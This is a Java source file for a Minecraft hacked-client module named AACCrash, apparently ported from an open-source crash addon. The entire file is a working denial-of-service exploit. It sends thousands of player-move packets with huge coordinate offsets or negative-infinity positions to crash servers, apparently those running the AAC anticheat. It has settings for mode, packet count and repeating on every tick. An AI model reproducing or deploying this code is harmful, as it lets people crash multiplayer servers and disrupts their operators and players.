// Ported from AntiCope/meteor-crash-addon (MIT License)
package thunder.hack.features.modules.crash;

import thunder.hack.features.modules.Module;
import thunder.hack.setting.Setting;
import net.minecraft.network.packet.c2s.play.PlayerMoveC2SPacket;

public class AACCrash extends Module {
    private final Setting<Mode> mode = new Setting<>("Mode", Mode.NEW);
    private final Setting<Integer> amount = new Setting<>("Amount", 5000, 100, 10000);
    private final Setting<Boolean> onTick = new Setting<>("OnTick", false);

    public AACCrash() {
        super("AACCrash", Category.CRASH);
    }

    @Override
    public void onEnable() {
        if (mc.player == null) return;
        if (!onTick.getValue()) {
            sendCrash();
            disable();
        }
    }

    @Override
    public void onUpdate() {
        if (mc.player == null || !onTick.getValue()) return;
        sendCrash();
    }

    private void sendCrash() {
        switch (mode.getValue()) {
            case NEW -> {
                for (int i = 0; i < amount.getValue(); i++) {
                    mc.getNetworkHandler().sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(mc.player.getX() + (9412.0 * i), mc.player.getY() + (9412.0 * i), mc.player.getZ() + (9412.0 * i), true));
                }
            }
            case OTHER -> {
                for (int i = 0; i < amount.getValue(); i++) {
                    mc.getNetworkHandler().sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(mc.player.getX() + (500000.0 * i), mc.player.getY() + (500000.0 * i), mc.player.getZ() + (500000.0 * i), true));
                }
            }
            case OLD -> {
                for (int i = 0; i < amount.getValue(); i++) {
                    mc.getNetworkHandler().sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(Double.NEGATIVE_INFINITY, Double.NEGATIVE_INFINITY, Double.NEGATIVE_INFINITY, true));
                }
            }
        }
    }

    public enum Mode {
        NEW, OTHER, OLD
    }
}
